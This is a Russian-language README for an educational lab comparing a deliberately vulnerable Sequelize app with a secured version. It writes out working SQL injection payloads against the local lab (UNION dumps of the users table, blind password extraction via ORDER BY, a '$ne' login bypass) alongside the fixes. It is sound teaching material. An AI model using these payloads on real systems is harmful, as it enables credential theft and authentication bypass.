# SQL Injection через ORM (Sequelize) — Атака и Защита

Учебная лаборатория, демонстрирующая, что **ORM не защищает автоматически от
SQL Injection**, если разработчик использует "сырые" вставки (`literal`,
`query` с конкатенацией) или передаёт необработанный пользовательский JSON
напрямую в `where()`.


## Структура проекта

```
sqli-orm-lab/
├── vulnerable/     # Уязвимое приложение (порт 3000)
│   └── src/
│       ├── server.js   # 4 уязвимых эндпоинта
│       └── models.js   # Sequelize модели + seed данных
├── secure/         # Та же логика, но защищённая (порт 3001)
│   └── src/
│       ├── server.js
│       └── models.js
└── docker-compose.yml
```

## Запуск

```bash
docker-compose up --build
```

- Уязвимое приложение: http://localhost:3000
- Защищённое приложение: http://localhost:3001

## Уязвимости и эксплуатация (на vulnerable-app, порт 3000)

### 1. SQL Injection через `sequelize.literal()` (UNION-based)

Эндпоинт `/api/products/search?category=...` собирает условие `where` вручную:

```js
where: sequelize.literal(`category = '${category}'`)
```

**Эксплуатация** (UNION-based, таблица `products` имеет 4 видимых поля + id/timestamps —
точное число колонок нужно подбирать перебором `ORDER BY N`):

```
GET /api/products/search?category=x' UNION SELECT 1,'hacked','data',999,'2024-01-01','2024-01-01' FROM users--
```

Цель: извлечь данные из таблицы `users` (включая пароли) через UNION-запрос,
используя таблицу `products` как точку входа.

### 2. SQL Injection через небезопасный `ORDER BY` (Blind / Boolean-based)

Эндпоинт `/api/products/filter?sort=...`:

```js
order: sequelize.literal(`${sort}`)
```

**Эксплуатация** (blind, через анализ порядка результатов или ошибок):

```
GET /api/products/filter?sort=(CASE WHEN (1=1) THEN id ELSE id END)
GET /api/products/filter?sort=(SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='S')
```

Подбирая символ за символом во втором payload'е, можно извлечь пароль
администратора, наблюдая, меняется ли порядок выдачи (true/false).

### 3. Operator Injection через JSON body (Authentication Bypass)

Эндпоинт `POST /api/login` передаёт `req.body` напрямую в `where`:

```js
where: { username: username, password: password }
```

> **Примечание:** в `vulnerable/src/models.js` намеренно включены
> `operatorsAliases` (`$ne`, `$gt`, `$or` и т.д.), которые в Sequelize 6.x
> по умолчанию **выключены** именно из-за этой уязвимости. Без них
> payload ниже не сработает — в этом проекте они включены специально,
> чтобы атака воспроизводилась "из коробки".

**Эксплуатация** — обход аутентификации (authentication bypass) без знания пароля:

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

Если в проекте включены legacy `operatorsAliases` (или используется похожий
паттерн с `$gt`, `$like` и т.п.), такой JSON превращает условие в
`username != NULL AND password != NULL`, что возвращает первого пользователя
из таблицы (обычно `admin`) — **аутентификация полностью обходится**.

### 4. Классическая SQL Injection через `sequelize.query()` с конкатенацией

```js
await sequelize.query(`SELECT id, username, email, role FROM users WHERE id = ${id}`)
```

**Эксплуатация**:

```
GET /api/users/raw?id=0 UNION SELECT id, username, password, role FROM users--
GET /api/users/raw?id=1 OR 1=1
```

Прямой дамп таблицы `users`, включая пароли.

## Как устроена защита (secure-app, порт 3001)

| # | Уязвимость | Защита |
|---|---|---|
| 1 | `sequelize.literal()` с конкатенацией | Обычный объект `where: { category }` — Sequelize строит prepared statement |
| 2 | Динамический `ORDER BY` из query-параметра | Whitelist допустимых полей и направлений (`SORTABLE_FIELDS`, `SORT_DIRECTIONS`) |
| 3 | `req.body` напрямую в `where` (Operator Injection) | Жёсткая проверка `typeof === 'string'` для всех значений перед передачей в `where`; объекты отклоняются с 400 |
| 4 | `sequelize.query()` с конкатенацией | `replacements: { id }` — параметризованный запрос + валидация, что `id` целое число |

Общие принципы, применённые в `secure/`:

1. **Никогда не строить SQL/условия через строковую конкатенацию пользовательского ввода.**
2. **Все динамические идентификаторы (имена колонок, направление сортировки) — через whitelist**, а не пользовательский ввод напрямую.
3. **Строгая валидация типов** входных данных до того, как они попадут в ORM-методы — особенно важно для JSON body, чтобы исключить Operator Injection.
4. **Параметризация** (`replacements` / `bind`) для любых raw-запросов.
5. **Хэширование паролей** (bcrypt) и сравнение хэшей, а не значений напрямую.
6. Общие сообщения об ошибках наружу — без `err.message`, чтобы не раскрывать структуру SQL/БД.

## Сравнение бок о бок

Запустите оба сервиса и сравните одинаковые запросы:

```bash
# Уязвимая версия - обход логина
curl -X POST http://localhost:3000/api/login -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# -> может вернуть admin без пароля

# Защищённая версия - тот же запрос
curl -X POST http://localhost:3001/api/login -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# -> 400 Bad Request: "username и password должны быть строками"
```

## Дальнейшие шаги для самостоятельного изучения

- Попробуйте написать скрипт автоматизации blind-инъекции через `/api/products/filter?sort=...` для извлечения пароля admin по символам.
- Изучите документацию Sequelize по `operatorsAliases` и почему они были удалены/ограничены в новых версиях по умолчанию — это прямое следствие подобных атак.
- Добейтесь, чтобы все 4 атаки на `vulnerable-app` возвращали ошибку/пустой результат на `secure-app`.
